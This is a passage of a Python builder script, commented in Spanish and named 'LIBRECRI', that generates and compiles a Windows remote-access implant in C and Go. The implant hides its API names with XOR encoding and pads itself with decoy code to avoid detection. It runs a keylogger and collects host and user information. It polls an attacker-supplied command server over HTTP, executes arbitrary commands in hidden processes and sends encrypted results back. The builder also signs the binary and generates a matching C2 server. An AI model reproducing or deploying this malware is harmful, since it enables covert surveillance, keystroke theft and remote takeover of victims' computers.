    A("extern BOOL       WINAPI InitCommonControlsEx(const INITCOMMONCONTROLSEX*);\n")
    A("extern HIMAGELIST WINAPI ImageList_Create(int,int,UINT,int,int);\n")
    A("extern HCERTSTORE WINAPI CertOpenSystemStoreA(HCRYPTPROV,LPCSTR);\n")
    A("extern BOOL       WINAPI CertCloseStore(HCERTSTORE,DWORD);\n")
    A("__attribute__((used)) static void * volatile const _fiat[] = {\n")
    A("  (void*)&InitCommonControlsEx,(void*)&ImageList_Create,\n")
    A("  (void*)&CertOpenSystemStoreA,(void*)&CertCloseStore,\n")
    A("  (void*)&GetFileVersionInfoSizeA,(void*)&GetFileVersionInfoA,\n")
    A("  (void*)&waveOutGetNumDevs,(void*)&waveOutGetVolume,\n")
    A("  (void*)&ImmGetDefaultIMEWnd,(void*)&ImmIsIME,\n")
    A("};\n")

    # Padding benigno
    A("__attribute__((used)) static const char _wua_err[] =\n  ")
    A(pad_c_blob + "\n  ;\n")
    A("static volatile int _nop = 0;\n")

    # typedefs kernel32 (solo los necesarios — sin VA/VF/GTC/IDP)
    A("typedef BOOL   (WINAPI *fn_CPA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);\n")
    A("typedef BOOL   (WINAPI *fn_CPIPE)(PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES,DWORD);\n")
    A("typedef BOOL   (WINAPI *fn_RF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);\n")
    A("typedef BOOL   (WINAPI *fn_SHI)(HANDLE,DWORD,DWORD);\n")
    A("typedef BOOL   (WINAPI *fn_CH)(HANDLE);\n")
    A("typedef BOOL   (WINAPI *fn_GCN)(LPSTR,LPDWORD);\n")
    A("typedef void   (WINAPI *fn_GNSI)(LPSYSTEM_INFO);\n")
    A("typedef HANDLE (WINAPI *fn_CTH)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);\n")
    A("typedef DWORD  (WINAPI *fn_WFSO)(HANDLE,DWORD);\n")
    A("typedef void   (WINAPI *fn_SLP)(DWORD);\n")
    A("typedef HANDLE (WINAPI *fn_CMA)(LPSECURITY_ATTRIBUTES,BOOL,LPCSTR);\n")
    A("static fn_CPA gCPA; static fn_CPIPE gCPIPE; static fn_RF gRF;\n")
    A("static fn_SHI gSHI; static fn_CH gCH;\n")
    A("static fn_GCN gGCN; static fn_GNSI gGNSI;\n")
    A("static fn_CTH gCTH; static fn_WFSO gWFSO; static fn_SLP gSLP;\n")
    A("static fn_CMA gCMA;\n")

    # typedefs ws2_32
    A("typedef int    (WINAPI *fn_WSAS)(WORD,_WSADATA*);\n")
    A("typedef SOCKET (WINAPI *fn_WSASOCK)(int,int,int,PVOID,UINT,DWORD);\n")
    A("typedef int    (WINAPI *fn_CONN)(SOCKET,const _SA4*,int);\n")
    A("typedef int    (WINAPI *fn_SND)(SOCKET,const char*,int,int);\n")
    A("typedef int    (WINAPI *fn_RCV)(SOCKET,char*,int,int);\n")
    A("typedef int    (WINAPI *fn_CSK)(SOCKET);\n")
    A("typedef int    (WINAPI *fn_WSAC)(void);\n")
    A("typedef int    (WINAPI *fn_GAI)(PCSTR,PCSTR,const _AI*,_AI**);\n")
    A("typedef void   (WINAPI *fn_FAI)(_AI*);\n")
    A("static fn_WSAS gWSAS; static fn_WSASOCK gWSOCK;\n")
    A("static fn_CONN gCONN; static fn_SND gSND; static fn_RCV gRCV;\n")
    A("static fn_CSK gCSK; static fn_WSAC gWSAC;\n")
    A("static fn_GAI gGAI; static fn_FAI gFAI;\n")

    # typedefs advapi32
    A("typedef BOOL (WINAPI *fn_GUN)(LPSTR,LPDWORD);\n")
    A("typedef LONG (WINAPI *fn_ROK)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);\n")
    A("typedef LONG (WINAPI *fn_RQV)(HKEY,LPCSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);\n")
    A("typedef LONG (WINAPI *fn_RCK)(HKEY);\n")
    A("static fn_GUN gGUN;\n")
    A("static fn_ROK gROK; static fn_RQV gRQV; static fn_RCK gRCK;\n")

    # typedefs user32 (keylogger)
    A("typedef HHOOK  (WINAPI *fn_SWHEX)(int,HOOKPROC,HINSTANCE,DWORD);\n")
    A("typedef LRESULT(WINAPI *fn_CNHEX)(HHOOK,int,WPARAM,LPARAM);\n")
    A("typedef BOOL   (WINAPI *fn_UWHEX)(HHOOK);\n")
    A("typedef BOOL   (WINAPI *fn_GMA)(LPMSG,HWND,UINT,UINT);\n")
    A("static fn_SWHEX gSWHEX; static fn_CNHEX gCNHEX;\n")
    A("static fn_UWHEX gUWHEX; static fn_GMA   gGMA;\n")

    A(f"static const unsigned char PK[16] = {PK_C};\n")
    A(f"static const unsigned char FNK = 0x{FNK:02X};\n")
    A("static void _xs(char *o,const unsigned char *e,int n)"
      "{for(int i=0;i<n;i++)o[i]=(char)(e[i]^FNK);o[n]=0;}\n")
    A("static void _px(unsigned char *p,int n)"
      "{for(int i=0;i<n;i++)p[i]^=PK[i%16];}\n")

    # _pad_init — dead code, usa todos los decoys, infla .text
    A("static void _pad_init(void){\n")
    A("  if(!_nop)return;\n")
    A("  INITCOMMONCONTROLSEX icc={sizeof(icc),ICC_WIN95_CLASSES};\n")
    A("  InitCommonControlsEx(&icc);\n")
    A("  HIMAGELIST il=ImageList_Create(16,16,ILC_COLOR32|ILC_MASK,8,4);(void)il;\n")
    A("  HCERTSTORE cs=CertOpenSystemStoreA((HCRYPTPROV)NULL,_wua_err);\n")
    A("  if(cs)CertCloseStore(cs,0);\n")
    A("  DWORD d=0;GetFileVersionInfoSizeA(_wua_err,&d);\n")
    A("  UINT w=waveOutGetNumDevs();DWORD v=0;\n")
    A("  waveOutGetVolume((HANDLE)NULL,&v);(void)w;(void)v;\n")
    A("  HKL hkl=(HKL)GetModuleHandleA(NULL);\n")
    A("  ImmIsIME(hkl);ImmGetDefaultIMEWnd((HWND)NULL);\n")
    A("}\n")

    # _load_libs — ahora solo 10 k32 + 9 ws2 + 4 adv = 23 calls (vs 29 antes)
    A("static void _load_libs(void){\n")
    A("  char fn[32];\n")

    A(f"  static const unsigned char _kn[]={k32_arr};\n")
    A(f"  char kn[14];_xs(kn,(unsigned char*)_kn,{k32_len});\n")
    A("  HMODULE hk=GetModuleHandleA(kn);\n")
    A("  if(hk){\n")
    for i, (gv, _fn) in enumerate(k_fns):
        enc, ln = k32_encs[gv]
        A(f"    static const unsigned char _k{i}[]={enc};\n")
        A(f"    _xs(fn,(unsigned char*)_k{i},{ln});{gv}=(void*)GetProcAddress(hk,fn);\n")
    A("  }\n")

    A(f"  static const unsigned char _wn[]={ws2_arr};\n")
    A(f"  char wn[12];_xs(wn,(unsigned char*)_wn,{ws2_len});\n")
    A("  HMODULE hw=(HMODULE)LoadLibraryA(wn);\n")
    A("  if(hw){\n")
    for i, (gv, _fn) in enumerate(ws2_fns):
        enc, ln = ws2_encs[gv]
        A(f"    static const unsigned char _w{i}[]={enc};\n")
        A(f"    _xs(fn,(unsigned char*)_w{i},{ln});{gv}=(void*)GetProcAddress(hw,fn);\n")
    A("  }\n")

    A(f"  static const unsigned char _an[]={adv_arr};\n")
    A(f"  char an[14];_xs(an,(unsigned char*)_an,{adv_len});\n")
    A("  HMODULE ha=(HMODULE)LoadLibraryA(an);\n")
    A("  if(ha){\n")
    for i, (gv, _fn) in enumerate(adv_fns):
        enc, ln = adv_encs[gv]
        A(f"    static const unsigned char _a{i}[]={enc};\n")
        A(f"    _xs(fn,(unsigned char*)_a{i},{ln});{gv}=(void*)GetProcAddress(ha,fn);\n")
    A("  }\n")

    # USER32 — ya cargada en proceso GUI, GetModuleHandleA
    A(f"  static const unsigned char _un[]={u32_arr};\n")
    A(f"  char un[12];_xs(un,(unsigned char*)_un,{u32_len});\n")
    A("  HMODULE hu=GetModuleHandleA(un);\n")
    A("  if(hu){\n")
    for i, (gv, _fn) in enumerate(u32_fns):
        enc, ln = u32_encs[gv]
        A(f"    static const unsigned char _u{i}[]={enc};\n")
        A(f"    _xs(fn,(unsigned char*)_u{i},{ln});{gv}=(void*)GetProcAddress(hu,fn);\n")
    A("  }\n")
    A("}\n")

    # _sk + _sa
    A("static char g_h[256],g_p[8];\n")
    A("static SOCKET _sk(void){\n")
    A("  if(!gWSAS||!gWSOCK||!gCONN||!gGAI||!gFAI) return _INVALID_SOCKET;\n")
    A("  _WSADATA wsd={0};gWSAS(0x0202,&wsd);\n")
    A("  _AI hints={0},*res=NULL;\n")
    A("  hints.fam=_AF_INET;hints.st=_SOCK_STREAM;hints.pr=_IPPROTO_TCP;\n")
    A("  if(gGAI(g_h,g_p,&hints,&res)!=0||!res) return _INVALID_SOCKET;\n")
    A("  SOCKET s=gWSOCK(_AF_INET,_SOCK_STREAM,_IPPROTO_TCP,NULL,0,0);\n")
    A("  if(s==_INVALID_SOCKET){gFAI(res);return _INVALID_SOCKET;}\n")
    A("  if(gCONN(s,res->a,(int)res->al)==_SOCKET_ERROR){gCSK(s);gFAI(res);return _INVALID_SOCKET;}\n")
    A("  gFAI(res);return s;\n}\n")
    A("static void _sa(SOCKET s,const char *b,int n)"
      "{int sent=0;while(sent<n){int r=gSND(s,b+sent,n-sent,0);if(r<=0)break;sent+=r;}}\n")

    # _hget
    A("static char g_mid[20]={0};\n")
    A("#define HBUF (32*1024)\n")   # 32 KB — cabeceras HTTP + body del comando
    A("static int _hget(unsigned char *out,int outsz){\n")
    A("  SOCKET s=_sk(); if(s==_INVALID_SOCKET) return -1;\n")
    A(f"  static const unsigned char _g[]={get_arr};\n")
    A(f"  static const unsigned char _u[]={ua_arr};\n")
    A(f"  static const unsigned char _e[]={mid_end_arr};\n")
    A(f"  char g[30],u[100],me[6];_xs(g,(unsigned char*)_g,{get_len});_xs(u,(unsigned char*)_u,{ua_len});_xs(me,(unsigned char*)_e,{mid_end_len});\n")
    A("  char req[640];int n=0;\n")
    A("  for(int i=0;g[i];i++)req[n++]=g[i];\n")
    A("  for(int i=0;g_h[i];i++)req[n++]=g_h[i];\n")
    A("  req[n++]=':';\n")
    A("  for(int i=0;g_p[i];i++)req[n++]=g_p[i];\n")
    A("  for(int i=0;u[i];i++)req[n++]=u[i];\n")
    A("  for(int i=0;g_mid[i];i++)req[n++]=g_mid[i];\n")
    A("  for(int i=0;me[i];i++)req[n++]=me[i];\n")
    A("  _sa(s,req,n);\n")
    A("  char rb[HBUF];int tot=0;\n")
    A("  while(tot<HBUF-1){int r=gRCV(s,rb+tot,HBUF-1-tot,0);if(r<=0)break;tot+=r;}\n")
    A("  gCSK(s);rb[tot]=0;\n")
    A("  int boff=-1;\n")
    A("  for(int i=0;i<tot-3;i++)\n")
    A("    if(rb[i]=='\\r'&&rb[i+1]=='\\n'&&rb[i+2]=='\\r'&&rb[i+3]=='\\n'){boff=i+4;break;}\n")
    A("  if(boff<0) return 0;\n")
    A("  int bl=tot-boff;if(bl<=0)return 0;if(bl>outsz)bl=outsz;\n")
    A("  for(int i=0;i<bl;i++)out[i]=(unsigned char)rb[boff+i];\n")
    A("  return bl;\n}\n")

    # _hpost
    A("static void _hpost(const unsigned char *body,int blen){\n")
    A("  if(blen<=0) return;\n")
    A("  SOCKET s=_sk(); if(s==_INVALID_SOCKET) return;\n")
    A(f"  static const unsigned char _p[]={post_arr};\n")
    A(f"  static const unsigned char _c[]={cl_arr};\n")
    A(f"  static const unsigned char _u[]={ua2_arr};\n")
    A("  char p[32],c[68],u[82];\n")
    A(f"  _xs(p,(unsigned char*)_p,{post_len});\n")
    A(f"  _xs(c,(unsigned char*)_c,{cl_len});\n")
    A(f"  _xs(u,(unsigned char*)_u,{ua2_len});\n")
    A("  char hdr[512];int n=0;\n")
    A("  for(int i=0;p[i];i++)hdr[n++]=p[i];\n")
    A("  for(int i=0;g_h[i];i++)hdr[n++]=g_h[i];\n")
    A("  hdr[n++]=':';\n")
    A("  for(int i=0;g_p[i];i++)hdr[n++]=g_p[i];\n")
    A("  for(int i=0;c[i];i++)hdr[n++]=c[i];\n")
    A("  char ns[12]={0};int ni=0,tmp=blen;\n")
    A("  if(!tmp){ns[ni++]='0';}\n")
    A("  else{char t[12];int ti=0;while(tmp>0){t[ti++]='0'+tmp%10;tmp/=10;}for(int i=ti-1;i>=0;i--)ns[ni++]=t[i];}\n")
    A("  for(int i=0;ns[i];i++)hdr[n++]=ns[i];\n")
    A("  for(int i=0;u[i];i++)hdr[n++]=u[i];\n")
    A("  _sa(s,hdr,n);_sa(s,(const char*)body,blen);\n")
    A("  char rb[256];int r=0;\n")
    A("  while((r=gRCV(s,rb,sizeof(rb),0))>0){}\n")
    A("  gCSK(s);\n}\n")

    # _ex — usa malloc en vez de VirtualAlloc
    A("#define MAXOUT (4*1024*1024)\n")   # 4 MB — screenshot base64 puede ser 2 MB+
    A("static int _ex(const char *cmd,unsigned char *ob,int osz){\n")
    A("  if(!gCPA||!gCPIPE||!gRF||!gCH||!gSHI) return 0;\n")
    A("  HANDLE hR,hW;\n")
    A("  SECURITY_ATTRIBUTES sa={sizeof(sa),NULL,TRUE};\n")
    A("  if(!gCPIPE(&hR,&hW,&sa,0)) return 0;\n")
    A("  gSHI(hR,HANDLE_FLAG_INHERIT,0);\n")
    A(f"  static const unsigned char _cx[]={cmd_arr};\n")
    A(f"  char cx[16];_xs(cx,(unsigned char*)_cx,{cmd_len});\n")
    A(f"  int pl={cmd_len};int cl=0;while(cmd[cl])cl++;\n")
    # malloc en vez de VirtualAlloc — sin constantes MEM_COMMIT/PAGE_READWRITE
    A("  char *full=(char*)malloc((size_t)(pl+cl+2));\n")
    A("  if(!full){gCH(hR);gCH(hW);return 0;}\n")
    A("  for(int i=0;i<pl;i++)full[i]=cx[i];\n")
    A("  for(int i=0;i<=cl;i++)full[pl+i]=cmd[i];\n")
    A("  STARTUPINFOA si={sizeof(si)};\n")
    A("  si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;\n")
    A("  si.wShowWindow=SW_HIDE;si.hStdOutput=hW;si.hStdError=hW;\n")
    A("  PROCESS_INFORMATION pi={0};\n")
    A("  if(!gCPA(NULL,full,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){\n")
    A("    free(full);gCH(hR);gCH(hW);return 0;}\n")
    A("  free(full);gCH(hW);\n")
    A("  DWORD tot=0,rd=0;\n")
    A("  while(gRF(hR,ob+tot,(DWORD)(osz-1-tot),&rd,NULL)&&rd>0){\n")
    A("    tot+=rd;if(tot>=(DWORD)(osz-1))break;}\n")
    A("  ob[tot]=0;gCH(hR);\n")
    A("  gWFSO(pi.hProcess,10000);\n")
    A("  gCH(pi.hProcess);gCH(pi.hThread);\n")
    A("  return (int)tot;\n}\n")

    # _si
    A("static int _si(unsigned char *ob,int osz){\n")
    A('  char comp[256]={0},user[256]={0},osn[256]="Windows";\n')
    A("  DWORD sz;\n")
    A("  sz=sizeof(comp);if(gGCN)gGCN(comp,&sz);\n")
    A("  sz=sizeof(user);if(gGUN)gGUN(user,&sz);\n")
    A(f"  static const unsigned char _rk[]={rk_arr};\n")
    A(f"  static const unsigned char _rv[]={rv_arr};\n")
    A(f"  char rk[96],rv[16];_xs(rk,(unsigned char*)_rk,{rk_len});_xs(rv,(unsigned char*)_rv,{rv_len});\n")
    A("  if(gROK){HKEY hk=NULL;\n")
    A("    if(gROK(HKEY_LOCAL_MACHINE,rk,0,KEY_READ,&hk)==0){\n")
    A("      sz=sizeof(osn);if(gRQV)gRQV(hk,rv,NULL,NULL,(LPBYTE)osn,&sz);\n")
    A("      if(gRCK)gRCK(hk);}}\n")
    A("  SYSTEM_INFO nsi={0};if(gGNSI)gGNSI(&nsi);\n")
    A('  const char *arch=(nsi.wProcessorArchitecture==9)?"x64":"x86";\n')
    A('  int n=(int)_snprintf((char*)ob,(size_t)(osz-1),\n')
    A('    "\\r\\nComputer: %s\\r\\nOS: %s (%s)\\r\\nUser: %s\\r\\n",\n')
    A("    comp,osn,arch,user);\n")
    A("  return (n>0)?n:0;\n}\n")

    # _gu
    A("static int _gu(unsigned char *ob,int osz){\n")
    A("  char comp[256]={0},user[256]={0};DWORD sz;\n")
    A("  sz=sizeof(comp);if(gGCN)gGCN(comp,&sz);\n")
    A("  sz=sizeof(user);if(gGUN)gGUN(user,&sz);\n")
    A('  int n=(int)_snprintf((char*)ob,(size_t)(osz-1),"\\r\\n%s\\\\%s\\r\\n",comp,user);\n')
    A("  return (n>0)?n:0;\n}\n")

    # ── Keylogger (WH_KEYBOARD_LL via USER32) ──────────────────────────────
    A("#define KBUF_SZ (32*1024)\n")
    A("static char g_kbuf[KBUF_SZ];\n")
    A("static volatile int g_kidx=0;\n")
    A("static HHOOK g_kh=NULL;\n")
    A("static HANDLE g_kth2=NULL;\n")
    A("static volatile int g_krun=0;\n")
    A("typedef struct{DWORD vkCode;DWORD scanCode;DWORD flags;DWORD time;ULONG_PTR dwExtraInfo;}_KBLL;\n")
    A("#ifndef WH_KEYBOARD_LL\n#define WH_KEYBOARD_LL 13\n#endif\n")
    A("static void _kmap(DWORD vk,char *o){\n")
    A("  if(vk>='A'&&vk<='Z'){o[0]=(char)(vk+32);o[1]=0;return;}\n")
    A("  if(vk>='0'&&vk<='9'){o[0]=(char)vk;o[1]=0;return;}\n")
    A("  if(vk==0x20){o[0]=' ';o[1]=0;return;}\n")
    A("  if(vk==0x0D){o[0]='[';o[1]='E';o[2]='N';o[3]='T';o[4]='E';o[5]='R';o[6]=']';o[7]=0;return;}\n")
    A("  if(vk==0x08){o[0]='[';o[1]='B';o[2]='S';o[3]=']';o[4]=0;return;}\n")
    A("  if(vk==0x09){o[0]='[';o[1]='T';o[2]='A';o[3]='B';o[4]=']';o[5]=0;return;}\n")
    A("  if(vk==0x1B){o[0]='[';o[1]='E';o[2]='S';o[3]='C';o[4]=']';o[5]=0;return;}\n")
    A("  if(vk>=0x60&&vk<=0x69){o[0]='0'+(char)(vk-0x60);o[1]=0;return;}\n")
    A("  sprintf(o,\"[%02X]\",(unsigned int)vk);\n}\n")
    A("static LRESULT CALLBACK _kbhook(int nCode,WPARAM wParam,LPARAM lParam){\n")
    A("  if(nCode>=0&&(wParam==0x0100||wParam==0x0104)){\n")
    A("    _KBLL *kb=(_KBLL*)lParam;char ch[16]={0};\n")
    A("    _kmap(kb->vkCode,ch);\n")
    A("    int l=(int)strlen(ch);\n")
    A("    if(g_kidx+l<KBUF_SZ-1){for(int i=0;i<l;i++)g_kbuf[g_kidx++]=ch[i];g_kbuf[g_kidx]=0;}\n")
    A("  }\n")
    A("  if(gCNHEX)return gCNHEX(NULL,nCode,wParam,lParam);\n")
    A("  return 0;\n}\n")
    A("static DWORD WINAPI _kthread(LPVOID _x){\n")
    A("  (void)_x;\n")
    A("  if(!gSWHEX)return 0;\n")
    A("  g_kh=gSWHEX(WH_KEYBOARD_LL,(HOOKPROC)_kbhook,NULL,0);\n")
    A("  if(!g_kh)return 0;\n")
    A("  MSG _msg;while(g_krun&&gGMA&&gGMA(&_msg,NULL,0,0)){}\n")
    A("  return 0;\n}\n")
    A("static void _kstart(void){\n")
    A("  if(g_kth2)return;\n")
    A("  g_kidx=0;g_kbuf[0]=0;g_krun=1;\n")
    A("  if(gCTH)g_kth2=gCTH(NULL,0,_kthread,NULL,0,NULL);\n}\n")
    A("static int _kdump(unsigned char *ob,int osz){\n")
    A("  int l=g_kidx;\n")
    A("  if(l<=0){ob[0]='(';ob[1]='e';ob[2]='m';ob[3]='p';ob[4]='t';ob[5]='y';ob[6]=')';ob[7]='\\n';return 8;}\n")
    A("  if(l>osz-2)l=osz-2;\n")
    A("  for(int i=0;i<l;i++)ob[i]=(unsigned char)g_kbuf[i];\n")
    A("  ob[l]='\\n';g_kidx=0;g_kbuf[0]=0;\n")
    A("  return l+1;\n}\n")
    A("static void _kstop(void){\n")
    A("  g_krun=0;\n")
    A("  if(gUWHEX&&g_kh){gUWHEX(g_kh);g_kh=NULL;}\n")
    A("  g_kth2=NULL;\n}\n")

    # _c2 — sin timing check, buffers con malloc, sleep simple
    A("#define CBUF (24*1024)\n")   # 24 KB — mic EncodedCommand llega a ~6.3 KB
    A("static DWORD WINAPI _c2(LPVOID _x){\n")
    A("  (void)_x;\n")
    A("  if(!gSLP||!gWSAS||!gCONN||!gSND||!gRCV) return 0;\n")
    A("  gSLP(3000);\n")   # simple sleep inicial, sin timing check
    A("  unsigned char *cb=(unsigned char*)malloc(CBUF);\n")
    A("  unsigned char *ob=(unsigned char*)malloc(MAXOUT);\n")
    A("  unsigned char *xb=(unsigned char*)malloc(MAXOUT);\n")
    A("  if(!cb||!ob||!xb){free(cb);free(ob);free(xb);return 0;}\n")
    A("  for(;;){\n")
    A("    int bl=_hget(cb,CBUF-1);\n")
    A("    if(bl<0){gSLP(5000);continue;}\n")
    A("    if(bl==0){gSLP(850);continue;}\n")
    A("    cb[bl]=0;_px(cb,bl);\n")
    A("    char *cmd=(char*)cb;\n")
    A("    if(bl==4&&cmd[0]=='E'&&cmd[1]=='X'&&cmd[2]=='I'&&cmd[3]=='T') break;\n")
    A("    int olen=0;\n")
    A("    if(bl>=6&&cmd[0]=='s'&&cmd[1]=='y'&&cmd[2]=='s')\n")
    A("      olen=_si(ob,MAXOUT-1);\n")
    A("    else if(bl>=6&&cmd[0]=='w'&&cmd[1]=='h'&&cmd[2]=='o'&&cmd[3]=='a'&&cmd[4]=='m'&&cmd[5]=='i')\n")
    A("      olen=_gu(ob,MAXOUT-1);\n")
    A("    else if(bl>=6&&cmd[0]=='K'&&cmd[1]=='S'&&cmd[2]=='T'&&cmd[3]=='A'&&cmd[4]=='R'&&cmd[5]=='T')\n")
    A("      {_kstart();ob[0]='O';ob[1]='K';ob[2]='\\n';olen=3;}\n")
    A("    else if(bl>=5&&cmd[0]=='K'&&cmd[1]=='D'&&cmd[2]=='U'&&cmd[3]=='M'&&cmd[4]=='P')\n")
    A("      olen=_kdump(ob,MAXOUT-1);\n")
    A("    else if(bl>=5&&cmd[0]=='K'&&cmd[1]=='S'&&cmd[2]=='T'&&cmd[3]=='O'&&cmd[4]=='P')\n")
    A("      {_kstop();ob[0]='O';ob[1]='K';ob[2]='\\n';olen=3;}\n")
    A("    else\n")
    A("      olen=_ex(cmd,ob,MAXOUT-1);\n")
    A("    if(olen>0){for(int i=0;i<olen;i++)xb[i]=ob[i];_px(xb,olen);_hpost(xb,olen);}\n")
    A("    else{unsigned char nl[2]={(unsigned char)(0x0D^PK[0]),(unsigned char)(0x0A^PK[1])};_hpost(nl,2);}\n")
    A("    gSLP(200);\n")
    A("  }\n")
    A("  free(cb);free(ob);free(xb);\n")
    A("  return 0;\n}\n")

    # constructor — sin IsDebuggerPresent, sin MOTW
    A("static HANDLE g_th=NULL;\n")
    A("__attribute__((constructor))\n")
    A("static void _ii(void){\n")
    A("  _load_libs();\n")
    A("  if(!g_mid[0]&&gGCN){char _t[256]={0};DWORD _s=sizeof(_t);gGCN(_t,&_s);int _i;for(_i=0;_i<16&&_t[_i];_i++)g_mid[_i]=_t[_i];g_mid[_i]=0;}\n")
    A(f"  static const unsigned char _mn[]={mtx_arr};\n")
    A(f"  char mn[20];_xs(mn,(unsigned char*)_mn,{mtx_len});\n")
    A("  if(gCMA){HANDLE _mtx=gCMA(NULL,TRUE,mn);if(GetLastError()==ERROR_ALREADY_EXISTS){if(gCH&&_mtx)gCH(_mtx);return;}}\n")
    A("  _pad_init();\n")
    A(f"  static const unsigned char _h[]={c2h_arr};\n")
    A(f"  static const unsigned char _p[]={c2p_arr};\n")
    A(f"  _xs(g_h,(unsigned char*)_h,{c2h_len});\n")
    A(f"  _xs(g_p,(unsigned char*)_p,{c2p_len});\n")
    A("  if(gCTH) g_th=gCTH(NULL,0,_c2,NULL,0,NULL);\n}\n")
    A("int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int n){\n")
    A("  (void)h;(void)p;(void)c;(void)n;\n")
    A("  if(g_th&&gWFSO) gWFSO(g_th,INFINITE);\n")
    A("  return 0;\n}\n")

    implant_c = "".join(C)

    c_path   = os.path.join(carpeta, "_lbr_http.c")
    exe_path = os.path.join(carpeta, f"{nombre_base}.exe")

    with open(c_path, "w", encoding="utf-8") as f:
        f.write(implant_c)

    res_vinfo = _generar_versioninfo_res(carpeta)
    extra_res = [res_vinfo] if res_vinfo else []

    r = subprocess.run(
        ["nice", "-n", "10", gcc, c_path] + extra_res + [
            "-o", exe_path,
            "-mwindows", "-static-libgcc", "-O1", "-s",
            "-lcomctl32", "-lcrypt32", "-lversion", "-lwinmm", "-limm32",
            "-Wl,--subsystem,windows",
            "-Wno-unused-but-set-variable", "-Wno-unused-function",
        ],
        capture_output=True, timeout=120)

    try: os.remove(c_path)
    except: pass
    if res_vinfo:
        try: os.remove(res_vinfo)
        except: pass

    if not os.path.exists(exe_path) or os.path.getsize(exe_path) < 10000:
        if r.stderr: warn(r.stderr.decode(errors="ignore")[:600])
        if r.stdout: warn(r.stdout.decode(errors="ignore")[:300])
        return None

    _firmar_exe(exe_path, carpeta)
    _generar_c2_server_http(carpeta, lport, xk_hex, nombre_base)
    sz_kb = os.path.getsize(exe_path)//1024
    ok(f"LIBRECRI C HTTP v5: {sz_kb} KB -- malloc heap, sin timing/antidebug/motw, FNK=0x{FNK:02X}")
    return exe_path

def _generar_librecri_go(lhost, lport, carpeta, nombre_base):
    """
    LIBRECRI Go edition — mismo protocolo, toolchain completamente distinto.
    Un binario Go (GOOS=windows) tiene estructura que el modelo Maluri nunca
    ha visto: goroutine scheduler, GC metadata, call conventions distintos.
    net.Dial no crea el patron WinSock2 clasico en el IAT.
    Compila con: go build GOOS=windows GOARCH=amd64 -ldflags="-s -w -H=windowsgui"
    """
    import secrets as _sec
    import tempfile

    go_bin = shutil.which("go")
    if not go_bin:
        warn("Go no encontrado — instala con: sudo apt install golang-go -y")
        return None

    xk     = _sec.token_bytes(16)
    xk_hex = xk.hex()

    def _xe(s):
        b   = s.encode()
        enc = bytes(c ^ xk[i % 16] for i, c in enumerate(b))
        return "{" + ",".join(f"0x{x:02X}" for x in enc) + "}", len(b)

    c2h_arr, c2h_len = _xe(str(lhost))
    c2p_arr, c2p_len = _xe(str(lport))

    # Clave en formato Go: 0xAA, 0xBB, ... (sin llaves — la f-string las agrega)
    xk_go  = ", ".join(f"0x{b:02X}" for b in xk)
    # c2h_arr/c2p_arr vienen de _xe() con llaves externas {0x..}.
    # Para []byte{{{c2h_go}}} en la f-string, necesitamos solo el interior.
    c2h_go = c2h_arr[1:-1]
    c2p_go = c2p_arr[1:-1]

    go_src = f"""\
package main

// LIBRECRI Go edition — HTTP poll
// Protocolo: GET /cmd (recibe cmd XOR-cifrado) · POST /res (envia resultado XOR)
// Trafico parece peticiones HTTP normales de navegador (Chrome UA)
// Compilar: GOOS=windows GOARCH=amd64 CGO_ENABLED=0
//   garble -tiny -literals build -ldflags="-H=windowsgui" -trimpath -o payload.exe .

import (
\t"bytes"
\t"io"
\t"math/rand"
\t"net/http"
\t"syscall"
\t"time"
\t"unsafe"
)

// Clave XOR unica por build — embebida tambien en c2_server.py
var _xk = []byte{{{xk_go}}}

// Strings cifradas — cero plaintext en el binario
var _ec2h = []byte{{{c2h_go}}}
var _ec2p = []byte{{{c2p_go}}}

func _xor(d []byte) []byte {{
\tout := make([]byte, len(d))
\tfor i, b := range d {{
\t\tout[i] = b ^ _xk[i%len(_xk)]
\t}}
\treturn out
}}

func _ds(enc []byte) string {{ return string(_xor(enc)) }}

// HTTP client — timeout fijo, sin seguir redirects
var _hc = &http.Client{{
\tTimeout: 10 * time.Second,
\tCheckRedirect: func(r *http.Request, v []*http.Request) error {{
\t\treturn http.ErrUseLastResponse
\t}},
}}

// User-Agent identico a Chrome en Windows — trafico parece navegador
const _ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

func _hget(url string) ([]byte, error) {{
\treq, err := http.NewRequest("GET", url, nil)
\tif err != nil {{
\t\treturn nil, err
\t}}
\treq.Header.Set("User-Agent", _ua)
\tresp, err := _hc.Do(req)
\tif err != nil {{
\t\treturn nil, err
\t}}
\tdefer resp.Body.Close()
\tif resp.StatusCode != 200 {{
\t\treturn nil, nil
\t}}
\treturn io.ReadAll(resp.Body)
}}

func _hpost(url string, data []byte) {{
\treq, err := http.NewRequest("POST", url, bytes.NewReader(data))
\tif err != nil {{
\t\treturn
\t}}
\treq.Header.Set("User-Agent", _ua)
\treq.Header.Set("Content-Type", "application/octet-stream")
\tresp, err := _hc.Do(req)
\tif err != nil {{
\t\treturn
\t}}
\tresp.Body.Close()
}}

func _run(s string) string {{
\t// CreateProcess directo — sin os/exec, sin strings predecibles en imports
\tvar rp, wp syscall.Handle
\tsa := syscall.SecurityAttributes{{
\t\tLength:        uint32(unsafe.Sizeof(syscall.SecurityAttributes{{}})),
\t\tInheritHandle: 1,
\t}}
\tif syscall.CreatePipe(&rp, &wp, &sa, 0) != nil {{
\t\treturn "err\\r\\n"
\t}}
\tcl, _ := syscall.UTF16PtrFromString("cmd.exe /c " + s)
\tsi := syscall.StartupInfo{{
\t\tCb:        uint32(unsafe.Sizeof(syscall.StartupInfo{{}})),
\t\tFlags:     syscall.STARTF_USESTDHANDLES,
\t\tStdOutput: wp,
\t\tStdErr:    wp,
\t}}
\tpi := syscall.ProcessInformation{{}}
\tsyscall.CreateProcess(nil, cl, nil, nil, true, 0x08000000, nil, nil, &si, &pi)
\tsyscall.CloseHandle(wp)
\tvar out []byte
